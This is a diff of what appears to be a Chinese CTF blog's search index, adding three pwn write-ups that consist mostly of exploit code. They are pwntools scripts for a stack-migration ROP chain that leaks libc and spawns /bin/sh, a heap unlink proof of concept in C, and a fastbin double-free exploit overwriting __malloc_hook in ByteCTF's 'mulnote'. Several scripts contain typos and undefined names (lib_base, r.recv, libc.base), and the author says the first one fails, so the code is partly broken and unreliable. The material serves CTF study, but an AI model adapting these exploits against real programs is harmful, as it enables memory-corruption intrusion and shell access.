@@ -4,6 +4,45 @@
   
     
     <entry>
+      <title>对于栈迁移技术的学习</title>
+      <link href="/2019/10/04/%E5%AF%B9%E4%BA%8E%E6%A0%88%E8%BF%81%E7%A7%BB%E6%8A%80%E6%9C%AF%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
+      <url>/2019/10/04/%E5%AF%B9%E4%BA%8E%E6%A0%88%E8%BF%81%E7%A7%BB%E6%8A%80%E6%9C%AF%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
+      
+        <content type="html"><![CDATA[<p>题目为 migration</p><p>栈迁移其实就是利用 leave ret<br>因为 leave ret 实际上就是<br>        mov esp  ebp<br>        pop  ebp<br>        pop  eip</p><p>这是我手动进行的栈迁移，但是…不知道为什么，puts接收数据接收不到，望大佬指正<br>from pwn import *<br>context.log_level = ‘debug’<br>sh = process(‘./migration’)<br>elf = ELF(‘./migration’)<br>libc = ELF(‘/lib/i386-linux-gnu/libc.so.6’)</p><p>read_plt = elf.symbols[‘read’]<br>puts_plt = elf.symbols[‘puts’]<br>puts_got = elf.got[‘puts’]<br>read_got = elf.got[‘read’]<br>buf = elf.bss() + 0x500<br>buf2 = elf.bss() + 0x400<br>leave_ret = 0x08048418</p><p>pop1_ret = 0x0804836d<br>pop3_ret = 0x08048569<br>################################# change stack space##########################<br>sh.recv()<br>payload = ‘a’*0x28 + p32(buf) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(buf) + p32(0x100)<br>sh.sendline(payload)<br>sleep(0.1)<br>################################# leak libc address ###########################<br>payload1 = p32(buf2) + p32(puts_plt) + p32(pop1_ret) + p32(puts_got) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(buf2) + p32(0x100)<br>sh.sendline(payload1)<br>puts_add = u32(sh.recv(4))<br>libc_base = puts_add - libc.symbols[‘puts’]<br>print “libc base address–&gt;[%s]”%hex(libc_base)<br>system_add = lib_base + libc.symbols[‘system’]<br>print “system address –&gt;[%s]”%hex(system_add)<br>#################################  get shell ##################################<br>payload = p32(buf) + p32(read_plt) + p32(pop3_ret) + p32(0) + p32(buf) + p32(0x100) + p32(system_add) + ‘bbbb’ + p32(buf)<br>sh.sendline(payload)<br>sh,sendline(‘/bin/sh\x00’)<br>sh.interactive()</p><p>下面是利用rop模块进行的，这就可以了</p><p>#!/usr/bin/env python<br>#! -<em>- coding: utf-8 -</em>-<br>from pwn import *<br>import time</p><p>sh = process(‘./migration’)<br>elf = ELF(‘migration’)</p><p>read_plt = 0x8048380<br>puts_plt = 0x8048390<br>leave_ret = 0x08048418<br>pop_edx_ret = 0x0804836d<br>puts_got = 0x8049ff0<br>#buf = 0x0804b000-0x200<br>#buf2 = buf + 0x100<br>buf = elf.bss() + 0x500<br>buf2 = elf.bss() + 0x400<br>payload = “a”*40<br>payload += flat([buf,read_plt,leave_ret,0,buf,100])<br>sh.recvuntil(“:”)<br>sh.send(payload)<br>sleep(0.1)</p><p>rop = flat([buf2,puts_plt,pop_edx_ret,puts_got,read_plt,leave_ret,0,buf2,100])</p><p>sh.sendline(rop)<br>sh.recvuntil(“\n”)<br>puts_off = 0x5fca0<br>libc = u32(r.recv(4)) - puts_off<br>print “libc:”,hex(libc)<br>sleep(0.1)<br>system_off = 0x3ada0<br>system = libc + system_off<br>rop2 = flat([buf,system,0,buf2+16,”/bin/sh”])<br>sh.sendline(rop2)<br>sh.interactive()</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>pwn unlink</title>
+      <link href="/2019/10/04/pwn%20%20unlink/"/>
+      <url>/2019/10/04/pwn%20%20unlink/</url>
+      
+        <content type="html"><![CDATA[<p>一个实验的poc</p><p>#include&lt;stdio.h&gt;<br>#include&lt;stdlib.h&gt;<br>#include&lt;unistd.h&gt;<br>unsigned long * target = 0;<br>void init(){<br>    setbuf(stdin,0);<br>    setbuf(stdout,0);<br>    setbuf(stderr,0);<br>}<br>int main(){<br>    init();<br>    unsigned long * ptr1 = malloc(0x88);<br>    unsigned long * ptr2 = malloc(0x88);<br>    unsigned long * ptr3 = malloc(0x18);<br>    target = ptr1;<br>    ptr1[0] = 0;<br>    ptr1[1] = 0x81;<br>    ptr1[2] = (unsigned long)(&amp;target) - 0x18;<br>    ptr1[3] = (unsigned long)(&amp;target) - 0x10;<br>    ptr2[-2] = 0x80;<br>    ptr2[-1] = 0x90;<br>    printf(“target = %p before free\n”,target);<br>    free(ptr2);<br>    printf(“target = %p after free\n”,target);<br>    printf(“pid = %d\n”,getpid());<br>    getchar();<br>    return 0;<br>}</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>byte ctf (pwn)</title>
+      <link href="/2019/10/04/byte%20ctf%20(pwn)/"/>
+      <url>/2019/10/04/byte%20ctf%20(pwn)/</url>
+      
+        <content type="html"><![CDATA[<p><strong>mulnote</strong><br>简单的组合攻击</p><p>from pwn import *<br>context.log_level = ‘debug’</p><p>sh = process(‘./mulnote’)<br>elf = ELF(‘mulnote’)<br>lib = ELF(‘./libc.so’)</p><p>def    choice(achar):<br>        sh.sendlineafter(‘&gt;’,achar)</p><p>def    add(size,con):<br>        sh.sendline(‘C’)<br>        sh.sendlineafter(‘&gt;’,str(size))<br>        sh.sendlineafter(‘&gt;’,con)</p><p>def    show():<br>        sh.sendline(‘S’)</p><p>def    free(idx):<br>        sh.sendline(‘R’)<br>        sh.sendlineafter(‘&gt;’,str(idx))</p><p>def    edit(idx,con):<br>        sh.sendline(‘E’)<br>        sh.sendlineafter(‘&gt;’,str(idx))<br>        sh.sendlineafter(‘&gt;’,con)</p><p>##################################leak libc################################################<br>add(0x100,’0’)<br>add(0x20,’1’)<br>free(0)<br>add(0x100,’A’)<br>show()<br>libc = u64(sh.recvuntil(‘\x7f’)[-4:].ljust(8,”\x00”))<br>log.success(“libc = %s”%hex(libc))<br>libc_base = libc - 0x3c<br>log.success(“libc_base = %s”%hex(libc_base))<br>malloc_hook = libc_base + lib.symbols[‘__malloc_hook’]<br>one = libc.base + 0x45216<br>######################################<br>add(0x60,’3’)<br>add(0x60,’4’)<br>free(3)<br>free(4)<br>free(3)</p><p>add(0x60,p64(malloc_hook-0x23)) #5<br>add(0x60,’6’)<br>add(0x60,’7’)<br>add(0x60,’x00’*0x13+p64(one)) #8<br>sh.sendlineafter(‘&gt;’,’C’)<br>sh.sendlineafter(‘size&gt;’,1)</p><p>sh.interactive()</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>buuctf pwn的刷题之旅（长期更）</title>
       <link href="/2019/10/04/buuctf%20pwn%E7%9A%84%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%EF%BC%89/"/>
       <url>/2019/10/04/buuctf%20pwn%E7%9A%84%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%EF%BC%89/</url>
